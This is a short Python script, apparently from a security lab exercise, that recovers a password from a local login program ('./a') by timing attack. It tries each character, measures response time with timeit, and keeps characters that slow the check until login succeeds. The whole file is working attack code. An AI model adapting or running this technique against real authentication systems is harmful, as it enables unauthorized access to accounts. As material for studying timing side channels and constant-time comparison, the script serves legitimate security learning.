from cmath import inf
import subprocess
import time
import random 
import string
import timeit

allowed_characters = string.ascii_letters + string.digits

def run_program(password,user):
    output = subprocess.run(["./a"] , capture_output=True, input="{}\n{}\n2".format(user,password).encode())
    return output.stdout.decode()

def main():
    user = "12"
    password = ''.join(random.choice(string.ascii_letters) for i in range(1))
    is_logged_in = False
    
    i = 0
    print(password)
    while True:
        for c in allowed_characters:
            alt = password[:i] + c + password[i+1:]
            print("alt: {}".format(alt))
            res = run_program(alt,user)
            is_logged_in = 'Not' not in res
            if is_logged_in:
                print("{} is the password".format(alt))
                return
            alt_time = timeit.timeit(lambda: run_program(alt,user), number=10)
            guess_time = timeit.timeit(lambda: run_program(password,user), number=10)
            if alt_time > 1.2 * guess_time:
                print(alt)
                password = alt
                break
        i += 1
# main()


main()
# user = "12"
# alt = "000000"
# guess_time = timeit.repeat(lambda: run_program(alt,user), number=10)
# print(min(guess_time))
# start_time = time.time()
# res = run_program('paas',12)
# end_time = time.time()
# print("Time taken: {}".format(end_time - start_time))
# is_logged_in = 'Not' not in res
# print("Is logged in: " + str(is_logged_in))